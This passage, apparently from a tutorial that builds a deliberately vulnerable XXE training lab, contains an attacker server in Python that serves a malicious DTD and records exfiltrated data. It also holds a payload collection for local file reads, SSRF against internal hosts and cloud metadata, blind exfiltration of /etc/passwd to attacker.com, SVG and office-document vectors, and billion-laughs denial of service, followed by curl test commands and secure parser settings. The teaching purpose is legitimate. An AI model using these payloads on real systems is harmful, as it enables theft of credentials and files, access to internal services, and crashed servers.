    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>`,
            normal: `<?xml version="1.0"?>
<user>
    <username>john_doe</username>
    <email>john@example.com</email>
</user>`
        };

        function loadPayload(type) {
            document.getElementById('xmlInput').value = payloads[type];
        }

        function sendRequest(endpoint) {
            const xml = document.getElementById('xmlInput').value;
            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/xml'},
                body: xml
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('response').textContent = JSON.stringify(data, null, 2);
            })
            .catch(err => {
                document.getElementById('response').textContent = 'Error: ' + err;
            });
        }
    </script>
</body>
</html>
```

---

### Attacker Server (for Blind XXE)

#### attacker-server/Dockerfile

```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY server.py .

RUN mkdir -p /app/dtd

EXPOSE 8888

CMD ["python", "server.py"]
```

#### attacker-server/server.py

```python
#!/usr/bin/env python3
"""
Attacker Server for Blind XXE Exfiltration
Educational purposes only!
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote
import datetime
import os

# Store captured data
captured_data = []

class AttackerHandler(BaseHTTPRequestHandler):
    
    def log_request(self, code='-', size='-'):
        """Custom logging"""
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] {self.command} {self.path} - {code}")
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)
        
        # Home page
        if path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.get_home_page().encode())
            return
        
        # View captured logs
        if path == '/logs':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.get_logs_page().encode())
            return
        
        # Serve malicious DTD
        if path == '/evil.dtd' or path == '/xxe.dtd':
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml-dtd')
            self.end_headers()
            dtd = self.generate_evil_dtd()
            self.wfile.write(dtd.encode())
            print(f"[*] Served evil DTD!")
            return
        
        # Capture exfiltrated data
        if path == '/collect' or path == '/exfil' or path.startswith('/steal'):
            data = params.get('data', params.get('d', params.get('x', [''])))[0]
            data = unquote(data)
            
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            captured_data.append({
                'timestamp': timestamp,
                'path': self.path,
                'data': data,
                'client': self.client_address[0]
            })
            
            print(f"\n{'='*60}")
            print(f"[!] DATA EXFILTRATED!")
            print(f"[!] From: {self.client_address[0]}")
            print(f"[!] Data: {data[:200]}...")
            print(f"{'='*60}\n")
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
            return
        
        # 404 for other paths
        self.send_response(404)
        self.end_headers()
    
    def do_POST(self):
        """Handle POST requests (for FTP-style exfil)"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        captured_data.append({
            'timestamp': timestamp,
            'path': self.path,
            'data': post_data,
            'client': self.client_address[0],
            'method': 'POST'
        })
        
        print(f"\n{'='*60}")
        print(f"[!] POST DATA RECEIVED!")
        print(f"[!] From: {self.client_address[0]}")
        print(f"[!] Data: {post_data[:500]}")
        print(f"{'='*60}\n")
        
        self.send_response(200)
        self.end_headers()
    
    def generate_evil_dtd(self):
        """Generate malicious DTD for blind XXE"""
        # This DTD will be customized based on query params
        return '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker:8888/collect?data=%file;'>">
%eval;
%exfil;'''
    
    def get_home_page(self):
        return '''<!DOCTYPE html>
<html>
<head>
    <title>XXE Attacker Server</title>
    <style>
        body { background: #1a1a2e; color: #eee; font-family: monospace; padding: 20px; }
        h1 { color: #ff6b6b; }
        .box { background: #16213e; padding: 20px; border-radius: 8px; margin: 20px 0; }
        code { background: #000; padding: 2px 6px; border-radius: 3px; color: #0f0; }
        a { color: #00ff88; }
        pre { background: #000; padding: 15px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>☠️ XXE Attacker Server</h1>
    <p>This server helps demonstrate blind XXE attacks</p>
    
    <div class="box">
        <h2>Available Endpoints</h2>
        <ul>
            <li><code>GET /evil.dtd</code> - Malicious DTD file</li>
            <li><code>GET /collect?data=...</code> - Capture exfiltrated data</li>
            <li><code>GET /logs</code> - View captured data</li>
        </ul>
    </div>
    
    <div class="box">
        <h2>Blind XXE Payload</h2>
        <pre>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ENTITY % xxe SYSTEM "http://attacker:8888/evil.dtd"&gt;
    %xxe;
]&gt;
&lt;root&gt;test&lt;/root&gt;</pre>
    </div>
    
    <div class="box">
        <h2>Custom DTD for File Exfiltration</h2>
        <pre>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://attacker:8888/collect?data=%file;'&gt;"&gt;
%eval;
%exfil;</pre>
    </div>
    
    <p><a href="/logs">📋 View Captured Data</a></p>
</body>
</html>'''
    
    def get_logs_page(self):
        logs_html = ""
        for entry in reversed(captured_data[-50:]):  # Last 50 entries
            logs_html += f'''
            <div class="log-entry">
                <strong>{entry['timestamp']}</strong> - {entry.get('client', 'unknown')}<br>
                <code>{entry.get('path', '')}</code><br>
                <pre>{entry.get('data', '')[:1000]}</pre>
            </div>'''
        
        if not logs_html:
            logs_html = "<p>No data captured yet...</p>"
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Captured Data</title>
    <style>
        body {{ background: #1a1a2e; color: #eee; font-family: monospace; padding: 20px; }}
        h1 {{ color: #00ff88; }}
        .log-entry {{ background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 3px solid #ff6b6b; }}
        pre {{ background: #000; padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; color: #0f0; }}
        a {{ color: #00ff88; }}
        code {{ background: #000; padding: 2px 6px; color: #ffd700; }}
    </style>
    <meta http-equiv="refresh" content="5">
</head>
<body>
    <h1>📋 Captured Data</h1>
    <p><a href="/">← Back</a> | Auto-refreshes every 5 seconds</p>
    {logs_html}
</body>
</html>'''


if __name__ == '__main__':
    PORT = 8888
    server = HTTPServer(('0.0.0.0', PORT), AttackerHandler)
    print(f'''
╔══════════════════════════════════════════════════════════════╗
║           XXE ATTACKER SERVER - Educational Only             ║
╠══════════════════════════════════════════════════════════════╣
║  Listening on port {PORT}                                       ║
║                                                              ║
║  Endpoints:                                                  ║
║  - http://attacker:8888/           Home page                 ║
║  - http://attacker:8888/evil.dtd   Malicious DTD             ║
║  - http://attacker:8888/collect    Data collection           ║
║  - http://attacker:8888/logs       View captured data        ║
╚══════════════════════════════════════════════════════════════╝
    ''')
    server.serve_forever()
```

---

### Internal Content (for SSRF demo)

#### Create internal-content folder:

```bash
mkdir internal-content
```

#### internal-content/index.html

```html
<!DOCTYPE html>
<html>
<head><title>Internal Server</title></head>
<body>
<h1>Internal Server - Not Publicly Accessible!</h1>
<p>If you can see this via XXE, you've performed SSRF!</p>
</body>
</html>
```

#### internal-content/secret.html

```html
<html>
<body>
<h1>CONFIDENTIAL INTERNAL DATA</h1>
<p>Internal API Key: internal_api_key_supersecret_12345</p>
<p>Database Password: db_pass_admin_root</p>
<p>Admin Token: admin_token_xyz789</p>
</body>
</html>
```

#### internal-content/api/users.json

```json
{
    "users": [
        {"id": 1, "username": "admin", "password": "admin123", "role": "admin"},
        {"id": 2, "username": "user1", "password": "pass123", "role": "user"}
    ]
}
```

---

### Secret Files for Practice

#### files/secret.txt

```
=====================================
  TOP SECRET CONFIDENTIAL FILE
=====================================

API_KEY=sk_live_abcdef123456789
DATABASE_URL=mysql://admin:password@localhost/production
AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE
ADMIN_PASSWORD=SuperSecretP@ssw0rd!

If you can read this, XXE attack was successful!
=====================================
```

#### files/config.xml

```xml
<?xml version="1.0"?>
<configuration>
    <database>
        <host>localhost</host>
        <port>3306</port>
        <username>root</username>
        <password>database_password_123</password>
    </database>
    <api>
        <key>production_api_key_secret</key>
        <secret>very_secret_value_here</secret>
    </api>
</configuration>
```

---

### XXE Payload Collection

#### payloads/xxe-payloads.txt

```
=================================================================
                    XXE PAYLOAD COLLECTION
              Educational/Testing Purposes Only!
=================================================================

### BASIC FILE READ ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

---

### WINDOWS FILE READ ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

---

### READ WITH PHP WRAPPER (Base64) ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

---

### SSRF - INTERNAL NETWORK ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://192.168.1.1/admin">
]>
<root>&xxe;</root>

---

### SSRF - CLOUD METADATA (AWS) ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

---

### BLIND XXE - PARAMETER ENTITY ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
    %xxe;
]>
<root>test</root>

---

### EVIL DTD FOR BLIND XXE ###
# Host this on your server as evil.dtd:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

---

### XXE VIA SVG UPLOAD ###

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text x="0" y="20">&xxe;</text>
</svg>

---

### XXE VIA XLSX/DOCX ###
# Modify [Content_Types].xml or other XML files inside the archive:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Types [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Types xmlns="...">
    <Default Extension="rels" ContentType="&xxe;"/>
</Types>

---

### BILLION LAUGHS (DoS) ###
# WARNING: Can crash servers!

<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>

---

### ERROR-BASED XXE ###

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
    %error;
    %e;
]>
<root>test</root>

=================================================================
```

---

## Part 6: Running the Lab

### Step 1: Create all files

```bash
# Create project structure
mkdir -p xxe-lab/{php-app,python-app,attacker-server,internal-content,files,payloads}
cd xxe-lab

# Create all the files as shown above
```

### Step 2: Build and run

```bash
# Start all containers
docker-compose up --build

# Or run in background
docker-compose up -d --build
```

### Step 3: Access the labs

```
PHP Lab:      http://localhost:8081
Python Lab:   http://localhost:8082
Attacker:     http://localhost:8888
```

### Step 4: Test XXE

```bash
# Basic XXE test with curl
curl -X POST http://localhost:8081/vulnerable.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'
```

---

## Part 7: Visual Flow of XXE Attack

```
┌─────────────────────────────────────────────────────────────────┐
│                      XXE ATTACK FLOW                            │
└─────────────────────────────────────────────────────────────────┘

Step 1: Attacker crafts malicious XML
┌─────────────────────────────────────┐
│ <?xml version="1.0"?>               │
│ <!DOCTYPE foo [                     │
│   <!ENTITY xxe SYSTEM               │
│     "file:///etc/passwd">           │
│ ]>                                  │
│ <data>&xxe;</data>                  │
└─────────────────────────────────────┘
                    │
                    ▼
Step 2: XML sent to vulnerable server
┌─────────────────────────────────────┐
│         VULNERABLE SERVER           │
│  ┌─────────────────────────────┐   │
│  │     XML Parser              │   │
│  │  - Entities ENABLED         │   │
│  │  - DTD Processing ON        │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
                    │
                    ▼
Step 3: Parser processes entity
┌─────────────────────────────────────┐
│ Parser sees: &xxe;                  │
│ Resolves: SYSTEM "file:///etc/..."  │
│ Reads file from filesystem!         │
└─────────────────────────────────────┘
                    │
                    ▼
Step 4: File content returned
┌─────────────────────────────────────┐
│ root:x:0:0:root:/root:/bin/bash     │
│ daemon:x:1:1:daemon:/usr/sbin:...   │
│ www-data:x:33:33:www-data:...       │
│ ...                                  │
└─────────────────────────────────────┘
```

---

## Part 8: Prevention Methods

```php
// PHP - SECURE Configuration
libxml_disable_entity_loader(true);  // Disable entity loading

$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET);   // Disable network access
// Don't use: LIBXML_NOENT or LIBXML_DTDLOAD
```

```python
# Python - SECURE Configuration
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,  # Disable entity resolution
    no_network=True,         # Disable network access
    dtd_validation=False,    # Disable DTD validation
    load_dtd=False           # Don't load DTD
)

# Or use defusedxml library
from defusedxml import ElementTree
tree = ElementTree.parse(xml_file)  # Safe by default!
```

```java
// Java - SECURE Configuration
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Disable all dangerous features
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

---

## Quick Reference Card

```
┌────────────────────────────────────────────────────────────────┐
│                    XXE QUICK REFERENCE                         │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  KEYWORDS TO KNOW:                                             │
│  • DOCTYPE  - Declares document type and DTD                   │
│  • ENTITY   - Defines a named piece of content                 │
│  • SYSTEM   - References external file/URL                     │
│  • PUBLIC   - References public DTD identifier                 │
│                                                                │
│  COMMON PROTOCOLS:                                             │
│  • file://  - Read local files                                 │
│  • http://  - Make HTTP requests (SSRF)                        │
│  • php://   - PHP wrappers (filter, input)                     │
│  • expect:// - Command execution (if enabled)                  │
│                                                                │
│  IMPACT:                                                       │
│  • File disclosure (read /etc/passwd, config files)            │
│  • SSRF (access internal services)                             │
│  • DoS (billion laughs)                                        │
│  • RCE (in some cases with expect://)                          │
│                                                                │
│  DETECTION:                                                    │
│  • Look for XML input points                                   │
│  • File uploads (SVG, DOCX, XLSX)                              │
│  • SOAP endpoints                                              │
│  • API endpoints accepting XML                                 │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

---

This lab environment provides:
- **4 different vulnerability scenarios** (basic, login, search, blind)
- **Multiple languages** (PHP, Python)
- **Attacker infrastructure** for blind XXE
- **Internal services** for SSRF demonstration
- **Complete payload collection**
- **Both vulnerable and secure examples**

Use only in isolated environments for learning! 🔐